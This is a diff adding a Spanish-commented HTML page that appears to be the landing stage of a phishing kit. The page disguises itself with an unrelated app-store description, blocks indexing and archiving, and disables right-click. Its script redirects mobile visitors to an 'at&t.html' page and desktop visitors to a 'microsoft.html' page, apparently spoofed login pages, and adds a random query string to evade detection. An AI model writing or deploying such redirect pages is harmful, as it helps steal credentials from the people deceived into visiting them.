@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="https://play.google.com/store/apps/details?id=com.alibaba.intl.android.apps.poseidon">
+    <meta name="theme-color" content="#563d7c">
+    <meta name="robots" content="NOINDEX,NOFOLLOW,NOARCHIVE,NOODP,NOSNIPPET">
+    <meta property="og:url" content="./view.html">
+    
+    <title>apple-touch-icon</title>
+
+    <!-- Íconos -->
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+
+    <!-- Canonical -->
+    <link rel="canonical" href="./view.html">
+</head>
+<body oncontextmenu="return false">
+
+<script>
+// Función para generar cadena aleatoria
+function generateRandomString(length) {
+    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+    let result = "";
+    for (let i = 0; i < length; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+}
+
+// Redirección según el dispositivo
+const isMobile = /Iphone|Ipod|Android|BlackBerry|IEMobile|Mobile|Windows Phone|webOS|bada|nokia|symbian|HTC/i.test(navigator.userAgent);
+const destination = isMobile ? "./at&t.html" : "./microsoft.html";
+window.location.href = `${destination}?${generateRandomString(7)}`;
+</script>
+
+</body>
+</html>
